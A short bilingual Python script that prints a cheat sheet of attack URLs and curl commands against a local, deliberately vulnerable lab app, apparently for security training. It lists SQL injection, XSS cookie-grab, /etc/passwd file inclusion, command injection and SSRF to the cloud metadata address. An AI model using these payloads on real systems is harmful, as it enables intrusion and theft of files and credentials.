#!/usr/bin/env python3

"""
بطاقة مرجعية سريعة بالروابط المصابة
Quick Reference Card for Infected Links
"""

def quick_reference():
    """Display quick reference of infected links"""
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                  بطاقة مرجعية سريعة - الروابط المصابة                     ║
║                   Quick Reference - Infected Links                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

[🎯] التطبيق التجريبي: http://127.0.0.1:5000 (يجب تشغيل vulnerable_app.py)

[⚠️] الروابط المصابة الرئيسية:

1️⃣ SQL Injection:
   http://127.0.0.1:5000/user?id=1' UNION SELECT 1,2,3,4--

2️⃣ XSS (Cross-Site Scripting):
   http://127.0.0.1:5000/search?q=<script>alert('XSS')</script>

3️⃣ LFI (Local File Inclusion):
   http://127.0.0.1:5000/include?file=../../../../etc/passwd

4️⃣ Command Injection:
   http://127.0.0.1:5000/execute?cmd=id;whoami;ls -la

5️⃣ SSRF (Server-Side Request Forgery):
   http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/

[🔧] أوامر curl للاختبار السريع:

# SQL Injection
curl "http://127.0.0.1:5000/user?id=1' UNION SELECT 1,@@version,3,4--"

# XSS
curl "http://127.0.0.1:5000/search?q=<script>alert(document.cookie)</script>"

# LFI
curl "http://127.0.0.1:5000/include?file=../../../../etc/passwd"

# Command Injection
curl "http://127.0.0.1:5000/execute?cmd=whoami;id;pwd"

# SSRF
curl "http://127.0.0.1:5000/fetch?url=http://localhost:80"

[🚀] للاستخدام:
1. python vulnerable_app.py
2. python poc_exploiter.py http://127.0.0.1:5000
3. أو استخدم curl/المتصفح للروابط أعلاه

[⚠️] تحذير: للاستخدام التعليمي فقط!
    """)

if __name__ == "__main__":
    quick_reference()